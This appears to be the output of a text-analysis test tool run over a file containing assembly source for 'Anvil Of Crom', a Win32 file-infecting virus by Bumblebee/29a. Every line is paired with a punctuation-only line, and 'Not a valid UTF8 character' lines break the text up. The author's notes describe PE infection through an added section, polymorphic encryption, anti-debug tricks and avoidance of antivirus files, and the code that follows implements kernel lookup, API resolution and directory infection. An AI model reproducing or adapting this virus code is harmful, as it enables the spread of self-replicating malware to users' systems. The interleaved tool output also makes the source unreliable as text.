@@ -1,0 +1,3710 @@
+00001: 
+
+Testing File [test\ASCII.txt]
+
+
+00002: ;
+00003: Pnct: ;
+00004: ;  [AOC] Anvil Of Crom
+00005: Pnct: ;     [ ]      
+00006: ;  coded by Bumblebee/29a
+00007: Pnct: ;         /
+00008: ;
+00009: Pnct: ;
+00010: ;   ÄÄÄÄÄÄÄÄÄÄ
+00011: Not a valid UTF8 character
+00012: Not a valid UTF8 character
+00013: Not a valid UTF8 character
+00014: Not a valid UTF8 character
+00015: Not a valid UTF8 character
+00016: Not a valid UTF8 character
+00017: Not a valid UTF8 character
+00018: Not a valid UTF8 character
+00019: Not a valid UTF8 character
+00020: Not a valid UTF8 character
+00021: Pnct: ;      
+00022: ;   Disclaimer
+00023: Pnct: ;      
+00024: ;   ÄÄÄÄÄÄÄÄÄÄ
+00025: Not a valid UTF8 character
+00026: Not a valid UTF8 character
+00027: Not a valid UTF8 character
+00028: Not a valid UTF8 character
+00029: Not a valid UTF8 character
+00030: Not a valid UTF8 character
+00031: Not a valid UTF8 character
+00032: Not a valid UTF8 character
+00033: Not a valid UTF8 character
+00034: Not a valid UTF8 character
+00035: Pnct: ;      
+00036: ;
+00037: Pnct: ;
+00038: ;   . This is the source code of a VIRUS. At the date of today a source
+00039: Pnct: ;       .                 .              
+00040: ;   cannot do any kind of damage to your comp. Use it at your own risk.
+00041: Pnct: ;                       .             .
+00042: ;   The author is not responsabile of any damage that may occur due to
+00043: Pnct: ;                              
+00044: ;   the assembly of this file.
+00045: Pnct: ;               .
+00046: ;
+00047: Pnct: ;
+00048: ;   ÄÄÄÄÄÄÄÄ
+00049: Not a valid UTF8 character
+00050: Not a valid UTF8 character
+00051: Not a valid UTF8 character
+00052: Not a valid UTF8 character
+00053: Not a valid UTF8 character
+00054: Not a valid UTF8 character
+00055: Not a valid UTF8 character
+00056: Not a valid UTF8 character
+00057: Pnct: ;      
+00058: ;   Abstract
+00059: Pnct: ;      
+00060: ;   ÄÄÄÄÄÄÄÄ
+00061: Not a valid UTF8 character
+00062: Not a valid UTF8 character
+00063: Not a valid UTF8 character
+00064: Not a valid UTF8 character
+00065: Not a valid UTF8 character
+00066: Not a valid UTF8 character
+00067: Not a valid UTF8 character
+00068: Not a valid UTF8 character
+00069: Pnct: ;      
+00070: ;
+00071: Pnct: ;
+00072: ;   . Win32 (assumed, not tested under W2k) run-time virus. Variable
+00073: Pnct: ;       .     ( ,         )   -   .  
+00074: ;   multi-layer encryption with polymorphism and key slide. Infects
+00075: Pnct: ;       -             .  
+00076: ;   EXE/DLL files adding new section. Some anti-debug tricks.
+00077: Pnct: ;       /         .     -   .
+00078: ;   Uses SEH. Uses CRC32 to find APIs instead of names. Infects the
+00079: Pnct: ;         .                 .    
+00080: ;   directories: current, windows and system. Updates the CheckSum
+00081: Pnct: ;       :   ,       .      
+00082: ;   of PE after infection using its own routine. Avoids infect most
+00083: Pnct: ;                     .      
+00084: ;   used anti-virus.
+00085: Pnct: ;         - .
+00086: ;
+00087: Pnct: ;
+00088: ;   ÄÄÄÄÄÄÄÄÄÄÄÄ
+00089: Not a valid UTF8 character
+00090: Not a valid UTF8 character
+00091: Not a valid UTF8 character
+00092: Not a valid UTF8 character
+00093: Not a valid UTF8 character
+00094: Not a valid UTF8 character
+00095: Not a valid UTF8 character
+00096: Not a valid UTF8 character
+00097: Not a valid UTF8 character
+00098: Not a valid UTF8 character
+00099: Not a valid UTF8 character
+00100: Not a valid UTF8 character
+00101: Pnct: ;      
+00102: ;   Introduction
+00103: Pnct: ;      
+00104: ;   ÄÄÄÄÄÄÄÄÄÄÄÄ
+00105: Not a valid UTF8 character
+00106: Not a valid UTF8 character
+00107: Not a valid UTF8 character
+00108: Not a valid UTF8 character
+00109: Not a valid UTF8 character
+00110: Not a valid UTF8 character
+00111: Not a valid UTF8 character
+00112: Not a valid UTF8 character
+00113: Not a valid UTF8 character
+00114: Not a valid UTF8 character
+00115: Not a valid UTF8 character
+00116: Not a valid UTF8 character
+00117: Pnct: ;      
+00118: ;
+00119: Pnct: ;
+00120: ;   . This is my first win32 PE appender. Another time the name is
+00121: Pnct: ;       .               .          
+00122: ;   due to the music i was listening when i coded the virus. This is
+00123: Pnct: ;                             .    
+00124: ;   a song from 'Conan the barbarian' original soundtrack. The main
+00125: Pnct: ;             '     '     .    
+00126: ;   theme of this amazing movie. Yeah, i know. I live in the past ;)
+00127: Pnct: ;               .   ,     .             ; )
+00128: ;
+00129: Pnct: ;
+00130: ;   . As ever i code a new virus i develope a lot of ideas but most
+00131: Pnct: ;       .                              
+00132: ;   are not included in the final version of the virus. May be you
+00133: Pnct: ;                         .      
+00134: ;   wonder why. Some ideas are not compatible and i must decide what
+00135: Pnct: ;         .                    
+00136: ;   to include. This happened some time ago with Deus. This virus
+00137: Pnct: ;         .               .    
+00138: ;   will not be finished... but some parts of it were include in
+00139: Pnct: ;             . . .                
+00140: ;   other projects like Luna, Anaphilaxys, ... and this virus. I'm
+00141: Pnct: ;             ,   ,   . . .       .   '
+00142: ;   not going to explain here what i did for AOC and is not included.
+00143: Pnct: ;                                 .
+00144: ;   hehehe. You'll see it in next viruses ;)
+00145: Pnct: ;       .   '             ; )
+00146: ;
+00147: Pnct: ;
+00148: ;   . I tried to exploit some properties of winblows showing technics
+00149: Pnct: ;       .                    
+00150: ;   really easy to code (if you're experienced win32 coder then skip
+00151: Pnct: ;               (   '          
+00152: ;   next two subpoints):
+00153: Pnct: ;           ) :
+00154: ;      - When a DLL is loaded by a process (run-time or at loading
+00155: Pnct: ;             -                   ( -      
+00156: ;   time by the system) the DLL main is executed to provide to the
+00157: Pnct: ;             )                  
+00158: ;   DLL a way to do some inits, as example. When a DLL is loaded the
+00159: Pnct: ;                   ,     .            
+00160: ;   system puts it in the same space of addresses of the process that
+00161: Pnct: ;                              
+00162: ;   loads the library. And, that is the most important, the work
+00163: Pnct: ;           .   ,           ,    
+00164: ;   directory of the DLL is the same of the loader. So if we infect
+00165: Pnct: ;                         .        
+00166: ;   a DLL and a process loads it, we must only scan in the work
+00167: Pnct: ;                   ,              
+00168: ;   directory for files to infect in the DLL and we get a nice way
+00169: Pnct: ;                                
+00170: ;   to spread. But this is limited. If the DLL is loaded in run-time
+00171: Pnct: ;         .         .               -
+00172: ;   we cannot infect a file being run (the damn OS fucks this kind of
+00173: Pnct: ;                     (            
+00174: ;   modification). Don't worry, there are a lot of posibilities: can
+00175: Pnct: ;       ) .   '   ,             :  
+00176: ;   be other EXE or DLL there to infect.
+00177: Pnct: ;                     .
+00178: ;      - In the infection of the PE adding a new section i do another
+00179: Pnct: ;             -                          
+00180: ;   little trick. If we look into the section description we see that
+00181: Pnct: ;         .                    
+00182: ;   Virtual Size is the size of the section into memory, and Physical
+00183: Pnct: ;                         ,    
+00184: ;   Size is the size of the section into the file aligned to the...
+00185: Pnct: ;                               . . .
+00186: ;   blah, blah. The only one restriction you find is that PS must be
+00187: Pnct: ;       ,   .                      
+00188: ;   less or equal to VS. So nothing is wrong if we set our section's
+00189: Pnct: ;               .                   '
+00190: ;   VS to <VirusSize>+<BufferSize>. So the size of the section grows
+00191: Pnct: ;           < > + < > .              
+00192: ;   in memory, filling the OS with zeroes the difference. This implies
+00193: Pnct: ;         ,               .    
+00194: ;   the code is structured in a special way... but nothing you cannot
+00195: Pnct: ;                     . . .        
+00196: ;   do. And alloc memory during the virus execution is not needed ;)
+00197: Pnct: ;       .                       ; )
+00198: ;   You say when you set up the new section attributes what amount of
+00199: Pnct: ;                              
+00200: ;   memory you want, but into the file the section is as small as
+00201: Pnct: ;           ,                    
+00202: ;   aligment lets: with 1000h as aligment (as example) the section
+00203: Pnct: ;         :           (   )    
+00204: ;   size will be 1000h bytes in file, but more of 1000h into memory.
+00205: Pnct: ;                   ,             .
+00206: ;
+00207: Pnct: ;
+00208: ;   Both tricks, are not tricks. I only coded it following the rules
+00209: Pnct: ;         ,       .              
+00210: ;   of windoze. This is basic and simple stuff, i know.
+00211: Pnct: ;         .             ,     .
+00212: ;
+00213: Pnct: ;
+00214: ;   . Trying to do the virus harder to analize i coded LENDE. 'Little
+00215: Pnct: ;       .                       .   '
+00216: ;   ENcryptor/DEcryptor' allows to encrypt little piezes of the
+00217: Pnct: ;       / '              
+00218: ;   virus using the CRC32 of another part of the virus as key.
+00219: Pnct: ;                             .
+00220: ;
+00221: Pnct: ;
+00222: ;   ÄÄÄÄÄÄÄÄ
+00223: Not a valid UTF8 character
+00224: Not a valid UTF8 character
+00225: Not a valid UTF8 character
+00226: Not a valid UTF8 character
+00227: Not a valid UTF8 character
+00228: Not a valid UTF8 character
+00229: Not a valid UTF8 character
+00230: Not a valid UTF8 character
+00231: Pnct: ;      
+00232: ;   Features
+00233: Pnct: ;      
+00234: ;   ÄÄÄÄÄÄÄÄ
+00235: Not a valid UTF8 character
+00236: Not a valid UTF8 character
+00237: Not a valid UTF8 character
+00238: Not a valid UTF8 character
+00239: Not a valid UTF8 character
+00240: Not a valid UTF8 character
+00241: Not a valid UTF8 character
+00242: Not a valid UTF8 character
+00243: Pnct: ;      
+00244: ;
+00245: Pnct: ;
+00246: ;   . Dinamic search for the kernel with SEH:
+00247: Pnct: ;       .               :
+00248: ;       - Windows 95/98
+00249: Pnct: ;               -     /
+00250: ;       - Windows NT
+00251: Pnct: ;               -    
+00252: ;       - Windows 2000
+00253: Pnct: ;               -    
+00254: ;
+00255: Pnct: ;
+00256: ;   . Scans the K32 for the needed APIs using CRC32 instead of names.
+00257: Pnct: ;       .                         .
+00258: ;   Takes care of the count of APIs exported from K32. May be in future
+00259: Pnct: ;                         .        
+00260: ;   versions of K32 any API i search is removed... or the name changes.
+00261: Pnct: ;                       . . .         .
+00262: ;   Bah, only makes the virus more stable.
+00263: Pnct: ;       ,             .
+00264: ;
+00265: Pnct: ;
+00266: ;   . Infection adding a new section called '.ntext'. Creates this section
+00267: Pnct: ;       .               ' . ' .      
+00268: ;   with a Virtual Size of <virus size>+<bufferSize> to have a nice buffer
+00269: Pnct: ;                 <   > + < >          
+00270: ;   when the program is mapped into memory in execution time.
+00271: Pnct: ;                         .
+00272: ;   I don't need to alloc memory in the virus execution 'cause system
+00273: Pnct: ;         '                   '  
+00274: ;   does this for me ;) This virus infects PE: both EXE and DLL. SEH used.
+00275: Pnct: ;               ; )         :         .     .
+00276: ;   When the virus jumps back to the host takes care of relocations 'cause
+00277: Pnct: ;                               '
+00278: ;   this jump is the only one fix address of the virus. The rest uses the
+00279: Pnct: ;                           .        
+00280: ;   delta offset with ebp.
+00281: Pnct: ;             .
+00282: ;
+00283: Pnct: ;
+00284: ;   . AOC infects EXE and DLL in current directory, if current directory
+00285: Pnct: ;       .                 ,      
+00286: ;   is not equal to windows directory then infects DLL into windows dir.
+00287: Pnct: ;                             .
+00288: ;   Moreover if current directory is not windows\system dir and is not
+00289: Pnct: ;                   \        
+00290: ;   windows dir, it infects all DLL found into windows\system. It's very
+00291: Pnct: ;         ,               \ .   '  
+00292: ;   infectious, so it can slow down the system. Due to this i used size
+00293: Pnct: ;       ,               .            
+00294: ;   padding as infection sign . So i can know if a file is infected
+00295: Pnct: ;               .                  
+00296: ;   using only findf and findn, that is looking only the size of the
+00297: Pnct: ;               ,                
+00298: ;   file. First execution of the virus in a clean system will be very
+00299: Pnct: ;       .                        
+00300: ;   slow, but not next times.
+00301: Pnct: ;       ,         .
+00302: ;
+00303: Pnct: ;
+00304: ;   . Contains a little trick that allows the virus to check if it's
+00305: Pnct: ;       .                         '
+00306: ;   being debugged. If this occurs the virus hangs the process. But
+00307: Pnct: ;         .                 .  
+00308: ;   if the aver is good using the debugger, there is nothing to do. Due
+00309: Pnct: ;                     ,           .  
+00310: ;   to this i coded LENDE. If the guy debugging modifies some code to
+00311: Pnct: ;               .                
+00312: ;   avoid a check of the virus, he must restore the change 'cause
+00313: Pnct: ;                 ,             '
+00314: ;   other pieze of code is encrypted and the decryptor uses it as
+00315: Pnct: ;                            
+00316: ;   key of encryption. This is used to protect different parts of
+00317: Pnct: ;           .                
+00318: ;   the virus i want unmodified. Moreover LENDE works as another layer
+00319: Pnct: ;               .            
+00320: ;   of encryption. One point aganist: the speed. With two layers of
+00321: Pnct: ;         .       :     .        
+00322: ;   encryption (one polymorphic) the infection part is slow... adding
+00323: Pnct: ;         (   )           . . .  
+00324: ;   LENDE means more loops.
+00325: Pnct: ;             .
+00326: ;   The first time the virus runs in a clean system... hehehe. If
+00327: Pnct: ;                         . . .   .  
+00328: ;   you don't have a Pentium better you go and take two beers from
+00329: Pnct: ;         '                      
+00330: ;   the kitchen.
+00331: Pnct: ;         .
+00332: ;
+00333: Pnct: ;
+00334: ;   . Uses variable encryption with polymorphism and two layers of
+00335: Pnct: ;       .                  
+00336: ;   encryption. The second one is not polymorphic and is only 8 bits.
+00337: Pnct: ;       .                       .
+00338: ;   The polymorphic one is of 64 bits, variable each 64 bits. This is
+00339: Pnct: ;                   ,         .    
+00340: ;   for avoid the damn emulators finding a generic decryptor. Darkman
+00341: Pnct: ;                       .  
+00342: ;   said me it is: 'Encryption with 64 bits key and slide'. First
+00343: Pnct: ;             :   '             ' .  
+00344: ;   notice! The polymorphism is like all polys i do: a shit :( Nothing
+00345: Pnct: ;       !                 :       : (  
+00346: ;   to do at this point, i feel coding polys is damn borring. But i
+00347: Pnct: ;               ,               .    
+00348: ;   ever do my best! It's a semi-slow polymorphic virus.
+00349: Pnct: ;             !   '     -     .
+00350: ;
+00351: Pnct: ;
+00352: ;   . Avoids infect most used av programs.
+00353: Pnct: ;       .             .
+00354: ;
+00355: Pnct: ;
+00356: ;   . If the internal counter is bigger than 100h the virus opens a
+00357: Pnct: ;       .                        
+00358: ;   console and writes there its copyright message. Better than simple
+00359: Pnct: ;                   .      
+00360: ;   messagebox ;)
+00361: Pnct: ;         ; )
+00362: ;
+00363: Pnct: ;
+00364: ;   Enjoy it!
+00365: Pnct: ;         !
+00366: ;
+00367: Pnct: ;
+00368: ;                                                     The way of the bee
+00369: Pnct: ;                                                                                                                  
+00370: ;
+00371: Pnct: ;
+00372: ;
+00373: Pnct: ;
+00374: ;    Thanx this time goes to Virus Buster for his tests under NT. And to
+00375: Pnct: ;                               .    
+00376: ;   my gf... hehehe i know how embarrassing i was when i did the dissasm
+00377: Pnct: ;         . . .                        
+00378: ;   of CheckSumMappedFile: this must be love ;)
+00379: Pnct: ;         :           ; )
+00380: ;
+00381: Pnct: ;
+00382: ;
+00383: Pnct: ;
+00384: .486p
+00385: Pnct: .
+00386: locals
+00387: .model flat,STDCALL
+00388: Pnct: .   ,
+00389:         extrn           ExitProcess:PROC        ; needed for 1st generation
+00390: Pnct:                                       :                 ;        
+00391:         vSize           equ     vEnd-vBegin     ; real size of the virus
+00392: Pnct:                                                 -           ;          
+00393:         cSize           equ     offset cryptEnd-offset cryptIni
+00394: Pnct:                                                   -  
+00395:         pathSize        equ     260             ; max size for the path
+00396: Pnct:                                                                     ;          
+00397:         ; some defines for LENDE. Three calls to LENDE used
+00398: Pnct:                 ;         .          
+00399:         LENDE0          equ     offset sname-offset inicio
+00400: Pnct:                                                 -  
+00401:         LENDE1          equ     offset scanK32-offset inicio
+00402: Pnct:                                                 -  
+00403:         LENDE2          equ     offset LENDE-offset inicio
+00404: Pnct:                                                 -  
+00405:         LENDESIZE0      equ     offset scanK32-offset sname
+00406: Pnct:                                         -  
+00407:         LENDESIZE1      equ     offset endScanK32-offset scanK32
+00408: Pnct:                                         -  
+00409:         LENDESIZE2      equ     offset endLENDE-offset LENDE
+00410: Pnct:                                         -  
+00411:         ; fixed addresses of three kernels...
+00412: Pnct:                 ;           . . .
+00413:         ; Quiz: why the kernel cannot have relocations?
+00414: Pnct:                 ;   :             ?
+00415:         K32WIN9X        equ     0bff70000h      ; Windows 95/98
+00416: Pnct:                                                       ;     /
+00417:         K32WINNT        equ     077f00000h      ; Windows NT
+00418: Pnct:                                                       ;    
+00419:         K32W2K          equ     077e00000h      ; Windows 2000
+00420: Pnct:                                                           ;    
+00421:         ; i do padding with 7 (this means [0,6] bytes)
+00422: Pnct:                 ;             (     [ , ]   )
+00423:         PADDING         equ     7               ; soft infection sign
+00424: Pnct:                                                                           ;      
+00425: ; from BC++ Win32 API on-line Reference
+00426: Pnct: ;     + +       -  
+00427: WIN32_FIND_DATA         struc
+00428: Pnct: _ _                  
+00429: dwFileAttributes        dd      0
+00430: Pnct:                            
+00431: dwLowDateTime0          dd      ?       ; creation
+00432: Pnct:                                 ?               ;  
+00433: dwHigDateTime0          dd      ?
+00434: Pnct:                                 ?
+00435: dwLowDateTime1          dd      ?       ; last access
+00436: Pnct:                                 ?               ;    
+00437: dwHigDateTime1          dd      ?
+00438: Pnct:                                 ?
+00439: dwLowDateTime2          dd      ?       ; last write
+00440: Pnct:                                 ?               ;    
+00441: dwHigDateTime2          dd      ?
+00442: Pnct:                                 ?
+00443: nFileSizeHigh           dd      ?
+00444: Pnct:                                   ?
+00445: nFileSizeLow            dd      ?
+00446: Pnct:                                     ?
+00447: dwReserved              dd      0,0
+00448: Pnct:                                         ,
+00449: cFileName               db      260 dup(0)
+00450: Pnct:                                             ( )
+00451: cAlternateFilename      db      14 dup(0)
+00452: Pnct:                           ( )
+00453:                         db      2 dup(0)
+00454: Pnct:                                                               ( )
+00455: WIN32_FIND_DATA         ends
+00456: Pnct: _ _                  
+00457: .DATA
+00458: Pnct: .
+00459:         ; dummy data
+00460: Pnct:                 ;    
+00461:         db      'WARNING - This is a virus carrier - WARNING'
+00462: Pnct:                             '   -             -   '
+00463: .CODE
+00464: Pnct: .
+00465: vBegin  label   byte
+00466: Pnct:          
+00467: inicio:
+00468: Pnct: :
+00469:         call    crypt                           ; decrypt the virus
+00470: Pnct:                                                                               ;      
+00471: cryptIni:
+00472: Pnct: :
+00473:         pushad
+00474: Pnct:                
+00475:                                                 ; decryptor for 2nd layer
+00476: Pnct:                                                                                                 ;        
+00477:         mov     ecx,offset cryptEnd-offset scndLayer
+00478: Pnct:                           ,   -  
+00479:         call    getDelta
+00480: Pnct:                        
+00481: getDelta:                                       ; get the delta offset
+00482: Pnct: :                                                                               ;        
+00483:         pop     ebp
+00484: Pnct:                          
+00485:         sub     ebp,offset getDelta
+00486: Pnct:                           ,  
+00487:         lea     esi,inicio+ebp
+00488: Pnct:                           , +
+00489:         add     esi,offset scndLayer-offset inicio
+00490: Pnct:                           ,   -  
+00491: cryptLoop2nd:
+00492: Pnct: :
+00493:         db      80h,36h                         ; xor byte ptr [esi],???
+00494: Pnct:                             ,                                                   ;         [ ] , ? ? ?
+00495: scndKey:                                        ; hardcoded
+00496: Pnct: :                                                                                 ;  
+00497:         db      00h
+00498: Pnct:                            
+00499:         inc     esi
+00500: Pnct:                          
+00501:         loop    cryptLoop2nd
+00502: Pnct:                        
+00503: scndLayer:                                      ; the virus really begins
+00504: Pnct: :                                                                             ;        
+00505:                                                 ; here...
+00506: Pnct:                                                                                                 ;   . . .
+00507:         xor     eax,eax
+00508: Pnct:                           ,
+00509:         call    CLENDE0                         ; call LENDE for zone 0
+00510: Pnct:                                                                           ;          
+00511: littleCrypt0:                                   ; for LENDE
+00512: Pnct: :                                                                       ;    
+00513:         db      68h                             ; push hardcoded
+00514: Pnct:                                                                                       ;    
+00515: hostEP:                                         ; with hostEP
+00516: Pnct: :                                                                                   ;    
+00517:         dd      offset exit
+00518: Pnct:                              
+00519:         db      68h                             ; push hardcoded
+00520: Pnct:                                                                                       ;    
+00521: reloc:
+00522: Pnct: :
+00523:         dd      offset inicio                   ; for relocs
+00524: Pnct:                                                                     ;    
+00525:         mov     esi,K32W2K                      ; scan for Windows 2000
+00526: Pnct:                           ,                                             ;        
+00527:         call    scanK32
+00528: Pnct:                        
+00529:         jnc     K32Found
+00530: Pnct:                          
+00531:         mov     esi,K32WINNT                    ; scan for Windows NT
+00532: Pnct:                           ,                                         ;        
+00533:         call    scanK32
+00534: Pnct:                        
+00535:         jnc     K32Found
+00536: Pnct:                          
+00537:         mov     esi,K32WIN9X                    ; scan for Windows 95/98
+00538: Pnct:                           ,                                         ;         /
+00539:         call    scanK32
+00540: Pnct:                        
+00541:         jc      goOut
+00542: Pnct:                            
+00543: K32Found:
+00544: Pnct: :
+00545:         mov     dword ptr [kernel32+ebp],esi    ; a K32 found? ;)
+00546: Pnct:                               [ + ] ,         ;       ?   ; )
+00547: littleCrypt1:                                   ; for LENDE
+00548: Pnct: :                                                                       ;    
+00549:         xor     eax,eax
+00550: Pnct:                           ,
+00551:         call    CLENDE1                         ; call LENDE for zone 1
+00552: Pnct:                                                                           ;          
+00553: littleCrypt2:                                   ; for LENDE
+00554: Pnct: :                                                                       ;    
+00555: ;
+00556: Pnct: ;
+00557: ; Get APIs stuff with CRC32 instead of names...
+00558: Pnct: ;                 . . .
+00559: ;
+00560: Pnct: ;
+00561:         mov     esi,dword ptr [kernel32+ebp]    ; get the needed APIs
+00562: Pnct:                           ,     [ + ]         ;        
+00563:         mov     esi,dword ptr [esi+3ch]         ; using the CRC32 method
+00564: Pnct:                           ,     [ + ]                   ;        
+00565:         add     esi,dword ptr [kernel32+ebp]
+00566: Pnct:                           ,     [ + ]
+00567:         mov     esi,dword ptr [esi+78h]
+00568: Pnct:                           ,     [ + ]
+00569:         add     esi,dword ptr [kernel32+ebp]
+00570: Pnct:                           ,     [ + ]
+00571:         add     esi,1ch
+00572: Pnct:                           ,
+00573:         lodsd
+00574: Pnct:                
+00575:         add     eax,dword ptr [kernel32+ebp]
+00576: Pnct:                           ,     [ + ]
+00577:         mov     dword ptr [address+ebp],eax
+00578: Pnct:                               [ + ] ,
+00579:         lodsd
+00580: Pnct:                
+00581:         add     eax,dword ptr [kernel32+ebp]
+00582: Pnct:                           ,     [ + ]
+00583:         mov     dword ptr [names+ebp],eax
+00584: Pnct:                               [ + ] ,
+00585:         lodsd
+00586: Pnct:                
+00587:         add     eax,dword ptr [kernel32+ebp]
+00588: Pnct:                           ,     [ + ]
+00589:         mov     dword ptr [ordinals+ebp],eax
+00590: Pnct:                               [ + ] ,
+00591:         sub     esi,16
+00592: Pnct:                           ,
+00593:         lodsd
+00594: Pnct:                
+00595:         mov     dword ptr [nexports+ebp],eax
+00596: Pnct:                               [ + ] ,
+00597:         xor     edx,edx
+00598: Pnct:                           ,
+00599:         mov     dword ptr [expcount+ebp],edx    ; set our counter to 0
+00600: Pnct:                               [ + ] ,         ;          
+00601:         lea     eax,FSTAPI+ebp
+00602: Pnct:                           , +
+00603: searchl:
+00604: Pnct: :
+00605:         mov     esi,dword ptr [names+ebp]
+00606: Pnct:                           ,     [ + ]
+00607:         add     esi,edx
+00608: Pnct:                           ,
+00609:         mov     esi,dword ptr [esi]
+00610: Pnct:                           ,     [ ]
+00611:         add     esi,dword ptr [kernel32+ebp]
+00612: Pnct:                           ,     [ + ]
+00613:         push    eax edx
+00614: Pnct:                          
+00615:         movzx   di,byte ptr [eax+4]
+00616: Pnct:                       ,     [ + ]
+00617:         call    CRC32
+00618: Pnct:                        
+00619:         xchg    ebx,eax
+00620: Pnct:                         ,
+00621:         pop     edx eax
+00622: Pnct:                            
+00623:         cmp     ebx,dword ptr [eax]
+00624: Pnct:                           ,     [ ]
+00625:         je      fFound
+00626: Pnct:                            
+00627:         add     edx,4
+00628: Pnct:                           ,
+00629:         inc     dword ptr [expcount+ebp]
+00630: Pnct:                               [ + ]
+00631:         push    edx                             ; test how many exports
+00632: Pnct:                                                                                   ;        
+00633:         mov     edx,dword ptr [expcount+ebp]    ; scanned yet to
+00634: Pnct:                           ,     [ + ]         ;      
+00635:         cmp     dword ptr [nexports+ebp],edx    ; avoid exception if
+00636: Pnct:                               [ + ] ,         ;      
+00637:         pop     edx                             ; the API is not there...
+00638: Pnct:                                                                                     ;           . . .
+00639:         je      goOut
+00640: Pnct:                            
+00641:         jmp     searchl
+00642: Pnct:                          
+00643: fFound:
+00644: Pnct: :
+00645:         shr     edx,1
+00646: Pnct:                           ,
+00647:         add     edx,dword ptr [ordinals+ebp]
+00648: Pnct:                           ,     [ + ]
+00649:         xor     ebx,ebx
+00650: Pnct:                           ,
+00651:         mov     bx,word ptr [edx]
+00652: Pnct:                           ,     [ ]
+00653:         shl     ebx,2
+00654: Pnct:                           ,
+00655:         add     ebx,dword ptr [address+ebp]
+00656: Pnct:                           ,     [ + ]
+00657:         mov     ecx,dword ptr [ebx]
+00658: Pnct:                           ,     [ ]
+00659:         add     ecx,dword ptr [kernel32+ebp]
+00660: Pnct:                           ,     [ + ]
+00661:         mov     dword ptr [eax+5],ecx
+00662: Pnct:                               [ + ] ,
+00663:         add     eax,9
+00664: Pnct:                           ,
+00665:         xor     edx,edx
+00666: Pnct:                           ,
+00667:         mov     dword ptr [expcount+ebp],edx
+00668: Pnct:                               [ + ] ,
+00669:         lea     ecx,ENDAPI+ebp
+00670: Pnct:                           , +
+00671:         cmp     eax,ecx
+00672: Pnct:                           ,
+00673:         jb      searchl
+00674: Pnct:                            
+00675:         xor     eax,eax
+00676: Pnct:                           ,
+00677:         call    CLENDE2                         ; call lende for zone 3
+00678: Pnct:                                                                           ;          
+00679: littleCrypt4:                                   ; for LENDE
+00680: Pnct: :                                                                       ;    
+00681:         inc     dword ptr [countGen+ebp]
+00682: Pnct:                               [ + ]
+00683:         cmp     dword ptr [countGen+ebp],100h
+00684: Pnct:                               [ + ] ,
+00685:         jb      skipWriteMessage
+00686: Pnct:                            
+00687:         call    dword ptr [_AllocConsole+ebp]   ; get a console if not
+00688: Pnct:                             [ _ + ]       ;          
+00689:                                                 ; alloced yet
+00690: Pnct:                                                                                                 ;    
+00691:         push    -11
+00692: Pnct:                         -
+00693:         call    dword ptr [_GetStdHandle+ebp]   ; get sdtout
+00694: Pnct:                             [ _ + ]       ;    
+00695:         inc     eax
+00696: Pnct:                          
+00697:         jz      skipWriteMessage
+00698: Pnct:                            
+00699:         dec     eax
+00700: Pnct:                          
+00701:         push    0                               ; write our message
+00702: Pnct:                                                                                       ;      
+00703:         lea     esi,polyBuffer+ebp
+00704: Pnct:                           , +
+00705:         push    esi
+00706: Pnct:                        
+00707:         push    messSize
+00708: Pnct:                        
+00709:         lea     esi,sname+ebp
+00710: Pnct:                           , +
+00711:         push    esi
+00712: Pnct:                        
+00713:         push    eax
+00714: Pnct:                        
+00715:         call    dword ptr [_WriteConsoleA+ebp]
+00716: Pnct:                             [ _ + ]
+00717: skipWriteMessage:
+00718: Pnct: :
+00719:         ; make the poly sample used later to infect
+00720: Pnct:                 ;                
+00721:         lea     eax,dword ptr [esp-8h]          ; setup SEH
+00722: Pnct:                           ,     [ - ]                     ;    
+00723:         xor     edi,edi                         ; ah... devil never sleeps
+00724: Pnct:                           ,                                                   ;   . . .      
+00725:         xchg    eax,dword ptr fs:[edi]
+00726: Pnct:                         ,     : [ ]
+00727:         lea     edi,DamnException+ebp
+00728: Pnct:                           , +
+00729:         push    edi
+00730: Pnct:                        
+00731:         push    eax
+00732: Pnct:                        
+00733:         call    dword ptr [_GetTickCount+ebp]   ; key for 1st layer
+00734: Pnct:                             [ _ + ]       ;        
+00735:         xor     eax,ebp
+00736: Pnct:                           ,
+00737:         mov     byte ptr [scndKey+ebp],al
+00738: Pnct:                               [ + ] ,
+00739:         call    dword ptr [_GetTickCount+ebp]   ; 64 bits key: ebx eax
+00740: Pnct:                             [ _ + ]       ;       :    
+00741:         mov     ebx,eax
+00742: Pnct:                           ,
+00743:         xor     eax,29a0babeh
+00744: Pnct:                           ,
+00745:         push    eax ebx
+00746: Pnct:                          
+00747:         lea     edi,tmpVirus+ebp
+00748: Pnct:                           , +
+00749:         add     edi,vSize
+00750: Pnct:                           ,
+00751:         mov     ecx,cSize
+00752: Pnct:                           ,
+00753:         call    AOCPE                           ; generate poly decriptor
+00754: Pnct:                                                                               ;      
+00755:         pop     ebx ecx
+00756: Pnct:                            
+00757:         mov     dword ptr [HiKey+ebp],ecx
+00758: Pnct:                               [ + ] ,
+00759:         mov     dword ptr [LoKey+ebp],ebx
+00760: Pnct:                               [ + ] ,
+00761:         add     eax,vSize
+00762: Pnct:                           ,
+00763:         mov     dword ptr [gensize+ebp],eax     ; save the size
+00764: Pnct:                               [ + ] ,           ;      
+00765:         xor     esi,esi                         ; quit SEH
+00766: Pnct:                           ,                                                   ;    
+00767:         pop     dword ptr fs:[esi]
+00768: Pnct:                               : [ ]
+00769:         pop     eax
+00770: Pnct:                          
+00771:         xor     eax,eax
+00772: Pnct:                           ,
+00773:         inc     eax
+00774: Pnct:                          
+00775:         call    infectDir                       ; search for exe in currdir
+00776: Pnct:                                                                       ;          
+00777:         xor     eax,eax
+00778: Pnct:                           ,
+00779:         call    infectDir                       ; search for dll in currdir
+00780: Pnct:                                                                       ;          
+00781:         lea     esi,currentPath+ebp             ; get current directory
+00782: Pnct:                           , +                           ;      
+00783:         push    esi
+00784: Pnct:                        
+00785:         push    pathSize
+00786: Pnct:                        
+00787:         call    dword ptr [_GetCurrentDirectoryA+ebp]
+00788: Pnct:                             [ _ + ]
+00789:         or      eax,eax
+00790: Pnct:                             ,
+00791:         jz      goOut
+00792: Pnct:                            
+00793:         push    pathSize                        ; get windows directory
+00794: Pnct:                                                                         ;      
+00795:         lea     esi,tempPath+ebp
+00796: Pnct:                           , +
+00797:         push    esi
+00798: Pnct:                        
+00799:         call    dword ptr [_GetWindowsDirectoryA+ebp]
+00800: Pnct:                             [ _ + ]
+00801:         or      eax,eax
+00802: Pnct:                             ,
+00803:         jz      goSystemDir
+00804: Pnct:                            
+00805:         mov     ecx,eax                         ; test if we are in win
+00806: Pnct:                           ,                                                   ;            
+00807:         lea     edi,currentPath+ebp             ; directory to avoid
+00808: Pnct:                           , +                           ;      
